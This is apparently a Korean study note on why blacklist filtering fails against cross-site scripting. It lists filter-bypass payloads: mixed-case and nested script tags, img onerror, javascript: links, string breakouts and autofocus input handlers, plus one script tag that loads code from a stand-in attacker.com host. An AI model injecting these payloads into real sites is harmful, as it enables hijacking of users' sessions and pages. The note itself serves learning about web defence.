# XSS 대응 방안(오답)

### 필터링&#x20;

: 사용자의 입력을 제한&#x20;

블랙 리스트 기반 필터링  = 특정 단어를 못들어오게 하는 것.&#x20;

🎈우회가 될 가능성이 존재한다.



### script 사이에 길이를 제한하면되지 않을까? (100\~200글자로 제한)

```javascript
<script> ~~~ </script>
```

다음과 같이 타 서버에서 가져올 수 있음.

```javascript
<script src="http://attacker.com/a.js"></script>
```



### script 단어 치환

```javascript
<ScRipT> </ScRipT>
```

대소문자 혼용으로 우회



### < script > -> <> 이렇게만 온다면

```javascript
< scrscriptipt > -> < script > 
```

이런 식으로 해결



### script -> xript&#x20;

```javascript
<img src=x onerror = "alert(1)">
```

script 라는 글자를 아예 사용하지 않는다.&#x20;

&#x20; 1\. <mark style="background-color:orange;">image Tag 활용</mark> : 거의 안 막는다.&#x20;

&#x20; 2\. Event Handler 활용 onload, onclick, onmouseover...&#x20;

&#x20; 3\. herf 활용 TEST 주소창에서 바로 js 실행 가능함.

```javascript
<a href="javascript:alert(1)">TEST</a>
```

&#x20;   위 앵커 태그에 스크립트 삽입 가능함. 링크 눌렀을 때, 페이지 이동 되는데 브라우저에서 javascript:alert(1)로 이동하면 alert가 뜬다.



### Javascript 내에서 XSS를 바로 사용가능한 케이스

&#x20;<, > 꺽쇠를 굳이 사용할 필요도 없음.

이미 javascript 안이라면 바로 다음과 같이 작성하면 됨.

```javascript
<script
  var data ="입력 가능한 곳";
</script>

이 상황이라고 가정할 때,
 
";alert(1);var a = "
을 작성하면 다음과 같이 완성된다.

<script
  var data ="";
  alert(1);
  var a = "";
</script>

우리가 원하는 스크립트를 alert(1);
```



### input XSS&#x20;

```javascript
<input type="text" value="실제 우리 데이터가 여기에 들어가는 경우가 많음." >
```

1\.  마우스 오버 시 실행&#x20;

```javascript
<input type="text" onmouseover="alert(1)">
```

2\.  클릭할 때 실행&#x20;

```javascript
<input type="text" onfocus="alert(1)">
```

3\.  자동 실행 -> <mark style="background-color:orange;">페이지가 로드되자 마자 alert 실행됨.</mark>

```javascript
<input type="text" autofocus onfocus="alert(1)">
```





이 밖에 <mark style="background-color:blue;">XSS bypass Cheat sheets</mark> 로 검색하면 다양한 방식들이 있다.

따라서 블랙 리스트 기반 필터링은 한계가 있다.





